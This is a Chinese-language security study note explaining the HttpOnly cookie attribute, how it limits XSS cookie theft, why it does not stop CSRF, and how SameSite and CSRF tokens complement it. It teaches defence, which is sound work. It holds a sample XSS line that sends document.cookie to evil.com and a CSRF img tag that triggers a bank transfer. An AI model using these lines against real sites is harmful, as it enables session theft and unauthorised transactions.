# HttpOnly Cookie 详解

## 📝 概要

`HttpOnly` 是 Cookie 的安全属性，用于 **禁止 JavaScript 访问 Cookie**，从而防止因 XSS 导致的敏感凭证泄露。

---

## 📌 一句话结论
>
> **HttpOnly = 浏览器能带，JS 不能读。**

---

## 🧠 Cookie 的两种“使用方式”

| 使用者 | 能做什么 |
|-----|--------|
| 浏览器网络层 | 自动携带 Cookie 发请求 |
| JavaScript | `document.cookie` 读取 / 写入 |

👉 `HttpOnly` 的作用：**切断 JS 这一条路**

---

## 🔐 HttpOnly 的行为规则

```http
Set-Cookie: session=abc123; HttpOnly
````

### ✅ 允许

- 浏览器在请求时 **自动携带 Cookie**

- 后端通过 Cookie 识别用户身份

### ❌ 禁止

- `document.cookie`

- XSS 窃取 Cookie

- JS 拼接 Cookie 到请求头

---

## 💥 HttpOnly 解决了什么问题？

### ❌ XSS 场景（未设置 HttpOnly）

```js
// 攻击者注入
fetch('https://evil.com/steal?c=' + document.cookie)
```

➡️ 登录态、Session、Token 全部泄露

---

### ✅ 设置 HttpOnly 后

```http
Set-Cookie: session=xxx; HttpOnly
```

- JS 读不到

- XSS 无法直接窃取会话凭证

- 攻击成本大幅上升

---

## ⚠️ 重要但容易误解的一点

> **HttpOnly 并不会阻止 Cookie 被发送**

```text
跨站请求 → 浏览器 → 目标域
```

只要：

- 域名匹配

- SameSite / Secure 条件满足

➡️ Cookie **仍然会自动携带**

---

## 🧨 HttpOnly 带来的“代价”：CSRF 风险

### 原因

- Cookie 自动携带

- 攻击者 **不需要读取 Cookie**

- 只需要“触发请求”

---

### 典型 CSRF 示例

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

- 用户已登录 bank.com

- session Cookie 是 HttpOnly

- 浏览器自动携带 Cookie

- 后端误以为是合法请求

➡️ **CSRF 成功**

---

## 🧠 核心理解（非常重要）

> **攻击者能“让浏览器带 Cookie”，但不能“读取 Cookie 内容”**

|能力|攻击者|
|---|---|
|发请求|✅|
|携带 Cookie|✅（自动）|
|读取 Cookie|❌（HttpOnly）|
|构造 CSRF Token|❌|

---

## 🛡️ HttpOnly 的正确搭配方案

### ⭐ 推荐组合（主流）

```http
Set-Cookie: session=xxx;
HttpOnly;
Secure;
SameSite=Lax
```

并配合：

- CSRF Token（Header 校验）

- 禁止 GET 修改数据

- 校验 Origin / Referer

---

## 🧩 HttpOnly + CSRF Token 的经典设计

### Cookie

```http
session=xxx; HttpOnly
csrfToken=yyy;
```

### 请求

```http
POST /api/transfer
X-CSRF-Token: yyy
Cookie: session=xxx
```

### 校验逻辑

1. Cookie 自动携带 session

2. 前端 JS 从 Cookie / Meta 读取 csrfToken

3. 后端校验 Header 中的 Token

4. 攻击者：

    - ❌ 读不到 csrfToken

    - ❌ 构造不了合法请求

---

## ⚠️ 常见误区

### ❌ HttpOnly 可以防 CSRF

> 错

- HttpOnly 只防 **XSS**

- 对 CSRF 无直接防护

---

### ❌ HttpOnly 会影响 fetch / axios

> 错

- 网络层 Cookie 不受影响

- 只和 JS API 有关

---

### ❌ HttpOnly 和 SameSite 是同一个东西

> 错

|属性|防什么|
|---|---|
|HttpOnly|XSS|
|SameSite|CSRF|

---

## 🎯 适用场景

- 登录态 Cookie

- Session ID

- Refresh Token（Cookie 模式）

❌ 不适合：

- 需要 JS 频繁读写的业务 Cookie

---

## 🔗 关联笔记

- [[CSRF 原理]]

- [[SameSite Cookie 详解]]

- [[Fetch credentials 参数]]

- [[XSS 攻击模型]]

---

## 🏷️ 标签

- #security #cookie #httponly #xss #csrf
